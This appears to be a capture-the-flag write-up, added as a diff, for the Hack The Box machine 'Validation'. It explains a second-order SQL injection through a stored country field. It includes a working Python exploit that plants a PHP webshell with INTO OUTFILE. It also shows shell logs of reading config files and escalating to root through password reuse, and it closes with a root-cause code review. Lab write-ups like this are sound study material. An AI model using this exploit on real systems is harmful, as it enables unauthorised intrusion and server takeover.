@@ -1,0 +1,239 @@
+---
+title: Validation
+description: Second Order SQLi
+---
+
+>Link: https://app.hackthebox.com/machines/Validation
+
+The registration form accepts a username and country field. Observing the response, the session cookie is always the MD5 hash of the username:
+
+Even changing the country during the submission and keeping the username same , the cookie doesnt seem to change at all and the same cookie is returned for 
+a given username. 
+
+```sh
+$ echo -n "test" | md5sum
+098f6bcd4621d373cade4e832627b4f6 
+```
+
+Also to note even non existing country value is accepted and later displayed in the `account` page. 
+This means that the country value is not being validated at all and is directly being stored. 
+
+Submitting ' as the country value registers normally and returns a cookie containing the MD5 hash of the username — no visible error at registration time.
+However, visiting /account.php with that cookie triggers a fatal SQL error, confirming the stored payload is being executed when the country value is retrieved and interpolated into the second query.
+
+```html
+
+section class="bg-dark text-center p-5 mt-4">
+		<div class="container p-5">
+            <h1 class="text-white">Welcome dsakdka</h1><h3 class="text-white">Other Players In '</h3><br />
+<b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in /var/www/html/account.php:33
+Stack trace:
+#0 {main}
+  thrown in <b>/var/www/html/account.php</b> on line <b>33</b><br />
+
+
+```
+### UNION Attack 
+
+Determining the number of columns by incrementing the SELECT until the query returns without error:
+
+```sql
+' union select 1;-- -
+```
+No error and one result returned — the query returns a single column, UNION injection confirmed.
+
+
+Using the REPL to enumerate the database further revealed no critical information.
+But checking the current user's privileges however revealed a `FILE` privilege, meaning the database user can read and write files on the server via INTO OUTFILE.
+
+>select privilege_type from information_schema.user_privileges where grantee="'uhc'@'localhost'"
+
+```sh
+>>> select current_user()
+uhc@localhost
+>>> select database()
+registration
+>>> select group_concat(table_name separator ', ') from information_schema.tables where table_schema=database()
+registration
+>>>select group_concat(column_name separator ', ') from information_schema.columns where table_schema=database() and table_name='registration'
+username, userhash, country, regtime
+>> select privilege_type from information_schema.user_privileges where grantee="'uhc'@'localhost'"
+SELECT
+INSERT
+UPDATE
+DELETE
+CREATE
+DROP
+RELOAD
+SHUTDOWN
+PROCESS
+FILE
+...
+```
+### POC
+
+ 
+
+```python
+import argparse
+import sys
+
+import requests
+from bs4 import BeautifulSoup
+from faker import Faker
+
+fake = Faker()
+URL = "http://X.X.X.X"  # Replace with the target URL
+proxies = {
+    "http": "http://127.0.0.1:8080",
+    "https": "http://127.0.0.1:8080",
+}
+
+
+def oracle(query):
+    username = fake.user_name()
+    data = {
+        "username": username,
+        "country": f"' union {query};-- -",
+    }
+    response = requests.post(URL, data, proxies=proxies)
+    soup = BeautifulSoup(response.text, "html.parser")
+    if soup.li:
+        return "\n".join([x.text for x in soup.findAll("li")])
+    return ""
+
+
+def repl():
+    while True:
+        try:
+            command = input(">>> ")
+            if command.lower() in ["exit", "quit"]:
+                break
+            res = oracle(command)
+            print(res)
+        except Exception as e:
+            print(f"Error: {e}")
+
+
+def shell():
+    oracle(
+        "select '<?php SYSTEM($_REQUEST[\"cmd\"]); ?>' into outfile '/var/www/html/shell.php'"
+    )
+    test = requests.get(f"{URL}/shell.php", params={"cmd": "id"}, proxies=proxies)
+    if test.status_code == requests.codes.ok and "uid=" in test.text:
+        print(f"[+] RCE confirmed!\n{test.text.strip()}")
+        print(f"[+] Visit {URL}/shell.php for confirmation!")
+    else:
+        print("[-] Shell upload may have failed — check manually")
+
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser()
+    parser.add_argument(
+        "--repl", action="store_true", help="Start interactive SQL REPL mode"
+    )
+    parser.add_argument(
+        "--shell", action="store_true", help="Upload webshell and get RCE"
+    )
+    args = parser.parse_args()
+
+    if args.repl:
+        print("Starting SQL REPL...")
+        repl()
+    elif args.shell:
+        print("Uploading webshell...")
+        shell()
+    else:
+        parser.print_help()
+        sys.exit(0)
+
+```
+
+After escalating from the webshell to a reverse shell, enumerating the web root revealed the database credentials stored in config.php:
+
+>https://www.revshells.com/
+
+```sh
+
+www-data@validation:/var/www/html$ ls
+account.php  config.php  css  index.php  js  rev.php
+
+www-data@validation:/var/www/html$ cat config.php 
+<?php
+  $servername = "127.0.0.1";
+  $username = "uhc";
+  $password = "REDACTED";
+  $dbname = "registration";
+
+  $conn = new mysqli($servername, $username, $password, $dbname);
+?>
+
+www-data@validation:/var/www/html$ cat /etc/passwd | grep "sh$"
+root:x:0:0:root:/root:/bin/bash
+
+www-data@validation:/var/www/html$ cd /home
+www-data@validation:/home$ ls
+htb
+www-data@validation:/home$ cd htb
+www-data@validation:/home/htb$ ls
+user.txt
+
+# Trying the common misconfiguration of password reuse. It worked !!!
+www-data@validation:/home/htb$ su root
+Password: 
+root@validation:/home/htb# cd /root
+ 
+
+```
+
+
+Finally, reviewing the source code confirms the root cause. The registration function uses a prepared statement, which safely parameterizes the country value at write time.
+However, account.php retrieves the stored country value and interpolates it directly into a second query without sanitization.
+
+>The payload is stored safely at registration but executes unsanitized at retrieval — which meets the definition of second-order SQL injection.
+
+```php
+
+ # Registration
+  require('config.php');
+  if ( $_SERVER['REQUEST_METHOD'] == 'POST' ) {
+    $userhash = md5($_POST['username']);
+    $sql = "INSERT INTO registration (username, userhash, country, regtime) VALUES (?, ?, ?, ?)";
+    $stmt = $conn->prepare($sql);
+    $stmt->bind_param("sssi", $_POST['username'], $userhash , $_POST['country'], time());
+    if ($stmt->execute()) {;
+	    setcookie('user', $userhash);
+	    header("Location: /account.php");
+	    exit;
+    }
+    $sql = "update registration set country = ? where username = ?";
+    $stmt = $conn->prepare($sql);
+    $stmt->bind_param("ss", $_POST['country'], $_POST['username']);
+    $stmt->execute();
+    setcookie('user', $userhash);
+    header("Location: /account.php");
+    exit;
+  }
+
+  #Account Page
+
+             <?php 
+              include('config.php');
+              $user = $_COOKIE['user'];
+              $sql = "SELECT username, country FROM registration WHERE userhash = ?";
+              $stmt = $conn->prepare($sql);
+              $stmt->bind_param("s", $user);
+              $stmt->execute();
+              
+              $result = $stmt->get_result(); // get the mysqli result
+              $row = $result->fetch_assoc(); // fetch data   
+              echo '<h1 class="text-white">Welcome ' . $row['username'] . '</h1>';
+              echo '<h3 class="text-white">Other Players In ' . $row['country'] . '</h3>';
+              $sql = "SELECT username FROM registration WHERE country = '" . $row['country'] . "'"; # Issue
+              $result = $conn->query($sql);
+              while ($row = $result->fetch_assoc()) {
+                echo "<li class='text-white'>" . $row['username'] . "</li>";
+              }
+?>
+
+```
